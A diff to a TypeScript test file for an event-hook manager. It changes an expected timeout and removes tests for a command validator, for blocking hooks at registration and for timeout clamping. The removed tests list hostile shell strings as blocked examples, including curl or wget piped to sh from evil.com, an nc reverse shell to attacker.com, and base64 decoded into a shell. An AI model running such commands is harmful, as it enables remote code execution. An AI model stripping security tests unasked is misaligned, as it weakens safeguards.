@@ -1,5 +1,5 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
-import { describe, it, expect, vi, beforeEach, afterEach, beforeAll } from 'vitest';
+import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import { EventHookManager, type EventHookConfig } from './eventHooks.js';
 import * as vscode from 'vscode';
 
@@ -239,7 +239,7 @@ describe('EventHookManager', () => {
       expect(seenCmd).toBe('./hooks/on-save.sh');
       const opts = seenOpts as { cwd?: string; timeout?: number } | null;
       expect(opts?.cwd).toBe('/p');
-      expect(opts?.timeout).toBe(10_000); // DEFAULT_HOOK_TIMEOUT_MS
+      expect(opts?.timeout).toBe(15_000);
       expect(mockLogger.debug).toHaveBeenCalledWith(expect.stringContaining('onSave completed'));
     });
 
@@ -367,103 +367,6 @@ describe('EventHookManager', () => {
       await new Promise((r) => setTimeout(r, 5));
 
       expect(mockLogger.warn).toHaveBeenCalledWith(expect.stringContaining('Failed to audit-log'));
-    });
-  });
-
-  describe('validateHookCommand', () => {
-    // Import the validation function
-    let validateHookCommand: (command: string) => string | null;
-
-    beforeAll(async () => {
-      const mod = await import('./eventHooks.js');
-      validateHookCommand = mod.validateHookCommand;
-    });
-
-    it('allows safe commands', () => {
-      expect(validateHookCommand('npm run lint')).toBeNull();
-      expect(validateHookCommand('./scripts/format.sh')).toBeNull();
-      expect(validateHookCommand('prettier --write "$SIDECAR_FILE"')).toBeNull();
-      expect(validateHookCommand('eslint --fix')).toBeNull();
-    });
-
-    it('blocks curl | sh patterns', () => {
-      expect(validateHookCommand('curl https://evil.com/script.sh | sh')).not.toBeNull();
-      expect(validateHookCommand('curl -s https://x.com/y | bash')).not.toBeNull();
-    });
-
-    it('blocks wget | sh patterns', () => {
-      expect(validateHookCommand('wget -O- https://evil.com/x | sh')).not.toBeNull();
-    });
-
-    it('blocks eval commands', () => {
-      expect(validateHookCommand('eval "$MALICIOUS"')).not.toBeNull();
-    });
-
-    it('blocks command substitution with curl', () => {
-      expect(validateHookCommand('$(curl https://evil.com/cmd)')).not.toBeNull();
-      expect(validateHookCommand('`curl https://evil.com/cmd`')).not.toBeNull();
-    });
-
-    it('blocks netcat reverse shells', () => {
-      expect(validateHookCommand('nc -e /bin/sh attacker.com 4444')).not.toBeNull();
-    });
-
-    it('blocks base64 decode piped to shell', () => {
-      expect(validateHookCommand('echo YmFzaA== | base64 -d | sh')).not.toBeNull();
-    });
-  });
-
-  describe('hook command validation at registration', () => {
-    it('skips registering hooks with blocked commands', () => {
-      manager.start({ onSave: 'curl https://evil.com | sh' });
-
-      // Hook should NOT be registered
-      expect(mockLogger.warn).toHaveBeenCalledWith(expect.stringContaining('Skipping onSave hook'));
-      expect(mockLogger.warn).toHaveBeenCalledWith(expect.stringContaining('security policy'));
-    });
-
-    it('registers valid hooks normally', () => {
-      manager.start({ onSave: 'npm run lint' });
-
-      // Hook should be registered
-      expect(mockLogger.info).toHaveBeenCalledWith(expect.stringContaining('Event hook registered: onSave'));
-      expect(mockLogger.warn).not.toHaveBeenCalled();
-    });
-  });
-
-  describe('configurable timeout', () => {
-    it('uses custom timeout when specified', async () => {
-      let seenTimeout: number | undefined;
-      sharedExec.mockImplementation(
-        (_cmd: string, opts: { timeout?: number }, cb: (e: unknown, out: string, err: string) => void) => {
-          seenTimeout = opts.timeout;
-          cb(null, '', '');
-        },
-      );
-
-      manager.start({ onSave: './test.sh', timeout: 30_000 });
-      const cb = mockWorkspace.onDidSaveTextDocument.mock.calls[0]?.[0];
-      cb({ uri: { path: 'x' } });
-      await new Promise((r) => setTimeout(r, 5));
-
-      expect(seenTimeout).toBe(30_000);
-    });
-
-    it('clamps timeout to maximum of 60 seconds', async () => {
-      let seenTimeout: number | undefined;
-      sharedExec.mockImplementation(
-        (_cmd: string, opts: { timeout?: number }, cb: (e: unknown, out: string, err: string) => void) => {
-          seenTimeout = opts.timeout;
-          cb(null, '', '');
-        },
-      );
-
-      manager.start({ onSave: './test.sh', timeout: 120_000 }); // Request 120s
-      const cb = mockWorkspace.onDidSaveTextDocument.mock.calls[0]?.[0];
-      cb({ uri: { path: 'x' } });
-      await new Promise((r) => setTimeout(r, 5));
-
-      expect(seenTimeout).toBe(60_000); // Clamped to 60s
     });
   });
 });
